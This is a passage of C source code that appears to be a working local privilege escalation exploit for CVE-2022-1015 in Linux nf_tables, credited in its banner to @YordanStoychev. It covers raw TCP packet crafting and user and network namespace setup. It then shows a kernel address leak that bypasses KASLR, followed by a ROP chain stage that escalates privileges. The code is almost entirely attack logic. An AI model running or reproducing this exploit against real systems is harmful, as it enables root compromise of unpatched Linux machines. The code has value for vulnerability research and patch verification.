	psh.dest_address = dst->sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + OPT_SIZE);
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE + data_size;
	// fill pseudo packet
	char* pseudogram = malloc(psize);
	memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + OPT_SIZE);

	// add the data to the pseudogram
	memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE, data, data_size);
	tcph->check = checksum((const char*)pseudogram, psize);
	iph->check = checksum((const char*)datagram, iph->tot_len);

	// add the data to the actual datagram
	memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE, data, data_size);

	*ack_packet = datagram;
	*ack_packet_len = iph->tot_len;

	free(pseudogram);
}

void *send_tcp_raw(void *arg){
	sleep(1);


	udp_data *udata = (udp_data *) arg;
	size_t size = udata->size;
	char* data = udata->data;
	uint16_t port = udata->port;
	char* dest_addr = udata->addr;
	dest_addr = "127.0.0.1";
	size_t addr_size = udata->addr_size;

	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	struct sockaddr_in daddr;
	daddr.sin_family = AF_INET;
	daddr.sin_port = htons(port);
	if (inet_pton(AF_INET, dest_addr, &daddr.sin_addr) != 1) {
		printf("destination IP configuration failed\n");
		exit(EXIT_FAILURE);
	}
	struct sockaddr_in saddr;
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(rand() % 65535); // random client port
	if (inet_pton(AF_INET, dest_addr, &saddr.sin_addr) != 1) {
		printf("source IP configuration failed\n");
		exit(EXIT_FAILURE);
	}

	int one = 1;
	const int *val = &one;
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) == -1) {
		printf("setsockopt(IP_HDRINCL, 1) failed\n");
		exit(EXIT_FAILURE);
	}

	int sent;
	/* SYN PACKET */
	uint16_t src_port = htons(rand() % 65535);
	char* syn_packet;
	int syn_packet_len;
	stage_syn_packet(&saddr, &daddr, &syn_packet, &syn_packet_len);
	if ((sent = sendto(sock, syn_packet, syn_packet_len, 0, (struct sockaddr*)&daddr,
					sizeof(struct sockaddr))) == -1) {
		printf("sendto() failed\n");
		exit(EXIT_FAILURE);
	}
	else {
		printf("[*] Successfully sent %d bytes SYN!\n", sent);
	}

	/* RECEIVE SYN-ACK PACKET */
	char recvbuf[DATAGRAM_LEN];
	int received = receive_from(sock, recvbuf, sizeof(recvbuf), &saddr);
	if (received <= 0){
		printf("receive_from() failed\n");
	}
	else {
		printf("[*] Successfully received %d bytes SYN-ACK!\n", received);
	}

	uint32_t seq_num, ack_num;
	read_seq_and_ack(recvbuf, &seq_num, &ack_num);

	printf("[*] Sending an ACK packet with the payload... \n");
	/* ACK PACKET */
	char* ack_packet;
	int ack_packet_len;
	stage_ack_packet(&saddr, &daddr, &ack_packet, &ack_packet_len, data, size, seq_num + 1, ack_num);
	if ((sent = sendto(sock, ack_packet, ack_packet_len, 0, (struct sockaddr*)&daddr,
					sizeof(struct sockaddr))) == -1) {
		printf("sendto() failed\n");
		exit(EXIT_FAILURE);
	}
	else { // if this is reached the exploit failed
		printf("[*] Exploit failed!\n", sent);
	}

	pthread_exit(NULL);
}



void *empty_tcp_listener(void *arg){
	listener_data *ldata = (listener_data *) arg;
	uint16_t port = ldata->port;

	char buffer[1024];

	char* ip = "127.0.0.1";
	size_t addr_size;
	int server_sock, client_sock, n;
	struct sockaddr_in server_addr, client_addr;
	server_sock = socket(AF_INET, SOCK_STREAM, 0);
  if (server_sock < 0){
    perror("[-] Socket error");
    exit(1);
  }
  printf("[+] TCP server socket created.\n");

  memset(&server_addr, '\0', sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  server_addr.sin_addr.s_addr = inet_addr(ip);

	n = bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
  if (n < 0){
    perror("[-] Bind error");
    exit(1);
  }
  printf("[+] Bind to the port number: %d\n", port);

	printf("[*] Listening...\n");
  listen(server_sock, 5);
	addr_size = sizeof(client_addr);
	client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &addr_size);
	printf("[+] Client connected.\n");
	bzero(buffer, 1024);
//	strcpy(buffer, "Some message wooo");
//	printf("[*] Data is about to be sent \n");
//	send(client_sock, buffer, strlen(buffer), 0);
//	recv(client_sock, buffer, sizeof(buffer), 0);
	printf("[*] Data sent. \n");
	close(client_sock);
//	printf("[*] Data received. \n");
	pthread_exit(NULL);
}


void write_to_file(const char *which, const char *format, ...) {
  FILE * fu = fopen(which, "w");
  va_list args;
  va_start(args, format);
  if (vfprintf(fu, format, args) < 0) {
    perror("cannot write");
    exit(1);
  }
  fclose(fu);
}


void setup_user_and_network_ns(void) {
	uid_t uid = getuid();
	gid_t gid = getgid();

  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
  }
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
  }

  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
    perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);
  }

	// now we map uid and gid
	write_to_file("/proc/self/uid_map", "0 %d 1", uid);
  // deny setgroups (see user_namespaces(7))
  write_to_file("/proc/self/setgroups", "deny");
  // remap gid
  write_to_file("/proc/self/gid_map", "0 %d 1", gid);

}

int main(){

	uint64_t leaked_kernel_address;
	uint64_t kbase; // the kernel base
	pid_t process_id = getpid(); // pid will not be changed by namespace creation

	printf("[*] CVE-2022-1015 LPE Exploit by @YordanStoychev \n\n");
	system("id");
	printf("[*] Setting up user+network namespace sandbox \n\n");
	setup_user_and_network_ns();
//	system("/bin/sh"); // to test out the namespace
	system("ip link set dev lo up"); // setting the loopback up
	printf("[+] STAGE 1: KASLR bypass\n");
	/* ADDRESS LEAKING STAGE */
	char *leak_table_name = "leak_table",
			 *leak_base_chain_name = "output_chain";

	// first setup the table and chain with output hook
	setup_table_and_chain(leak_table_name, leak_base_chain_name, NF_INET_LOCAL_OUT);

	uint16_t port = 50005;

	// we setup the rules that will allow us to leak the address
	add_rule(leak_table_name, leak_base_chain_name, RULE_ADDRESS_LEAK, port, 0);
	printf("[*] Address leak rule created! \n");
	// lets actually leak this bad boy
	pthread_t thread_id_send;
	struct udp_data dummy_data;
	char* As = "AAAAAAAA";
	char* dest_addr = "127.0.0.1";
	dummy_data.data = As;
	dummy_data.size = sizeof(dummy_data.data) / sizeof(char);
	dummy_data.port = port;
	dummy_data.addr = dest_addr;
	dummy_data.addr_size = sizeof(dummy_data.addr);
	pthread_create(&thread_id_send, NULL, send_udp_packet, (void *)&dummy_data);

	// lets receive the address
	struct listener_data ldata;
	ldata.port = port;
	bzero(ldata.address, 8);
	pthread_t thread_id_receive;
	pthread_create(&thread_id_receive, NULL, receive_address, (void *)&ldata);

	printf("[*] Packet sent... if no output in a second - it has failed \n");
	pthread_join(thread_id_send, NULL);
	pthread_join(thread_id_receive, NULL);

	leaked_kernel_address = *(uint64_t *)ldata.address;
	printf("[&] Leaked Address: 0x%" PRIx64 "\n", leaked_kernel_address);
	kbase = leaked_kernel_address - release_sock_63;
	printf("[&] Kernel base address: 0x%" PRIx64 "\n\n", kbase);

	/* ROP STAGE */

	uint16_t rop_port = 50006; // we set another port for the rop triggering stage

	char *rop_table_name = "rop_table",
			 *rop_base_chain_name = "output_chain";


	printf("[+] STAGE 2: Escalation \n");


	setup_table_and_chain(rop_table_name, rop_base_chain_name, NF_INET_LOCAL_OUT);
	add_rule(rop_table_name, rop_base_chain_name, RULE_PORT_CHECK, rop_port, kbase);
//	add_rule(rop_table_name, rop_base_chain_name, RULE_INBOUND_OUTBOUND, rop_port, kbase);
	add_rule(rop_table_name, rop_base_chain_name, RULE_ROP_CHAIN, rop_port, kbase);

	printf("[*] Copy ROP-to-Stack rules created. \n");
	//new_stack = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)+0x3ff0;
	save_userland_registers();
	send_ROP_chain(rop_port, kbase, process_id);

	return 0;
}
